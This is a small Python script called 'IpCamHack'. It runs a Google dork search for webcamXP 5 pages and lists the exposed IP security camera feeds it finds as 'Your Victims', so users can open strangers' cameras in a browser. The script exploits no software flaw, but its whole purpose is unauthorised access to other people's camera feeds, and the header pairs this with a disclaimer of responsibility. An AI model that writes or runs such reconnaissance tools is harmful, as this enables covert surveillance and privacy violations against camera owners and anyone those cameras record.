#!/usr/python
"""this tool is designed by b3rd%20mw01u X codex You Can Access IP security camera by
copy the link and open it in browser
NB: Iam  Not Responsible For Any Illegal Activities"""
##################################
import sys
import os
import time
import random
from googlesearch import search
###################################
"""c0l0r_C0d3"""

BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0m"     # White
R = "\033[31m"    # Red
C = "\033[36m"    # Cyan
#############################################

rand = (BB,YY,GG,WW,RR,CC)
P = random.choice(rand)
os.system('clear')
def load(word):
        for char in word:
                print(char,end='')
                sys.stdout.flush()
                time.sleep(0.2)
def banner():
        print(W)
        print('='*60)
        print(GG)
        os.system('figlet IpCamHack')
        print(W)
        print('='*60)
        print(P)
        print(' ===============================================')
        print('      @      code by: berd-mwolu X codex    @')
        print('      |                                     |')
        print('      @      lang: Python                   @')
        print('      |                                     |')
        print('      @      version: 1.1                   @')
        print(" ================================================\n")
payload='intitle:\"webcamXP 5\" #payload'
banner()
load("Wait For Few Minutes Targets Are Loading....\n")
time.sleep(0.3)
os.system('clear')
banner()
print(W)
num=random.randint(5,51)
result=search(payload,num_results=num) #google search result
list_str='\n  \n'.join([str(elem) for elem in result]) #list_to_string
print(f'{G}[{W}+{G}] {Y}Your Victims')
print(P)
print(list_str)

print("\n\n")
print("by")
os.system("figlet TEAM 404")
